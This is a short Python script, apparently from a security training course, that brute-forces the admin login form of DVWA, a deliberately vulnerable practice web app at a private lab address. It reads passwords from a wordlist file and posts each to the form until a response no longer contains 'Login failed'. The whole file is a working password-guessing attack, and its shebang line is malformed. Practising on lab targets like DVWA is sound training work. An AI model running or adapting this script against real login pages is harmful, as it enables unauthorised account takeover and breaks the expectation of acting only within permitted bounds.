#!usr/bin/env python

import requests

target_url="http://10.0.2.20/dvwa/login.php"
data_dict={"username":"admin","password":"","Login":"submit"}


with open("/root/Downloads/passwords.list", "r") as password_file:
    for line in password_file:
        word=line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode():
            print("[+] Got the password --> "+ word)
            exit()

print("[+] Reached end of line.")
